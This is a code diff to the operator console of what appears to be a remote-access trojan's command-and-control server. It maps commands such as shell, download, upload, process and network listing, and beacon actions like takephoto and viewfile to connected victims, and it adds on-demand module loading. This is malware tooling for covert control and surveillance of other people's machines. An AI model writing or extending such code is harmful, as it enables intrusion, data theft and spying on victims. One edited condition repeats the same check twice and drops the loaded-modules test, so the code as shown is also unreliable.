@@ -38,7 +38,7 @@ class InteractionHandler:
             "shell": lambda: session_obj.shell(conn, r_address),
             "close": lambda: session_obj.close_connection(conn, r_address),
             "processes": lambda: session_obj.list_processes(conn, r_address),
-            "sysinfo": lambda: session_obj.systeminfo(conn, r_address),
+            "system_info": lambda: session_obj.systeminfo(conn, r_address),
             "checkfiles": lambda: session_obj.checkfiles(conn),
             "download": lambda: session_obj.DownloadFiles(conn),
             "upload": lambda: session_obj.UploadFiles(conn),
@@ -46,7 +46,8 @@ class InteractionHandler:
             "netstat": lambda: session_obj.netstat(conn, r_address),
             "diskusage": lambda: session_obj.diskusage(conn, r_address),
             "listdir": lambda: session_obj.list_dir(conn, r_address),
-            "beacon": handle_beacon
+            "beacon": handle_beacon,
+            "module": lambda: session_obj.load_module_session(conn, r_address),
         }
 
         while True:
@@ -65,8 +66,22 @@ class InteractionHandler:
             
             handler = command_handlers.get(command)
             if handler:
+                if command not in session_obj.loaded_modules and command not in ["module", "beacon", "close", "shell"]:
+                    logger.warning("Module not loaded, cannot execute command.")
+                    print(colorama.Fore.RED + "Module not loaded, cannot execute command.")
+                    load = input(
+                        colorama.Fore.YELLOW + "Load module? (y/N): ").lower().strip()
+                    if load == "y":
+                        logger.info(f"Loading module for command: {command}")
+                        print("Loading module, please wait...")
+                        session_obj.load_module_direct_session(conn, r_address, command)
+                        handler()
+                        print("handler called")
+                        continue  # back to prompt after execution
+                    else:
+                        logger.info("Module not loaded, command skipped.")
+                        continue
                 try:
-                    logger.info(f"Executing command: {command}")
                     handler()
                     if command == "close":
                         logger.info("Connection closed by command.")
@@ -116,7 +131,7 @@ class InteractionHandler:
             "takephoto": lambda: beaconClass.takePhoto(UserID),
             "listfiles": lambda: beaconClass.list_files(UserID),
             "viewfile": lambda: beaconClass.view_file(UserID),
-            "module": lambda: beaconClass.load_module(UserID),
+            "module": lambda: beaconClass.load_module_beacon(UserID),
         }
 
         while True:
@@ -136,14 +151,15 @@ class InteractionHandler:
             default_commands = ["commands", "shell", "close", "module"]
             if handler:
                 # Only check for module loading for non-default commands
-                if command not in default_commands and command not in getattr(beaconClass, "loaded_modules", []):
+                if command not in default_commands and command not in default_commands:
                     logger.warning("Module not loaded, cannot execute command.")
                     print(colorama.Fore.RED + "Module not loaded, cannot execute command.")
                     load = input(
                         colorama.Fore.YELLOW + "Load module? (y/N): ").lower().strip()
                     if load == "y":
                         logger.info(f"Loading module for command: {command}")
-                        beaconClass.load_module_directly(UserID, command)
+                        beaconClass.load_module_direct_beacon(UserID, command)
+                        continue  # wait for module load before executing command
                     else:
                         logger.info("Module not loaded, command skipped.")
                         continue
